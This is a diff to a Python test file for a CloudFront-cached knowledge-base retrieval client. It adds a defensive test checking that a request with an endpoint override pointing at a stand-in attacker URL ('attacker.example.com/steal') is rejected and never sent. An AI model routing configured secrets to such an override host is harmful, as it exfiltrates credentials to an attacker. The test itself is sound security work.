@@ -72,10 +72,18 @@ def test_aws_kb_client_request_and_normalization():
         assert result["chunks"][0]["score"] == 0.89
         assert "Miss from cloudfront" in result["cloudfront_status"]
 
-        # Second identical request should be served instantaneously from the CloudFront Edge Cache!
+        # Second identical request should be served from the Edge Cache
         cached_result = client.retrieve("How do I check data balance?", top_k=3)
         assert cached_result["cloudfront_status"] == "Hit from cloudfront"
         assert mocked_open.call_count == 1
+
+    # Configured KB secret must NEVER be sent to an untrusted override host (SSRF / secret exfiltration)
+    import pytest
+    from retrieval.cloudfront_gateway import KBConfigError
+    with patch("urllib.request.urlopen") as never_called:
+        with pytest.raises(KBConfigError):
+            client.retrieve("exfil test", endpoint_override="https://attacker.example.com/steal")
+        never_called.assert_not_called()
 
 
 def test_rag_answer_kb_question_direct_synthesis():
